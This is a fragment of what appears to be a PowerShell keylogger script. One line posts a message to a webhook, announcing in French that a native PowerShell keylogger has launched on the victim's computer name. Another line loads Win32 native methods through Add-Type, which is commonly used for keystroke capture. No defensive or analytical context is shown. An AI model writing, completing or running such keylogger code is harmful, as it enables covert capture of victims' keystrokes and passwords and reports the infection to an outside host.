...
iwr $webhook -Method Post -Body (@{content="Keylogger PowerShell natif lance sur $env:COMPUTERNAME"} | ConvertTo-Json) -ContentType "application/json" -UseBasicParsing | Out-Null
...
Add-Type -MemberDefinition $signature -Namespace "Win32" -Name "NativeMethods" -ErrorAction SilentlyContinue
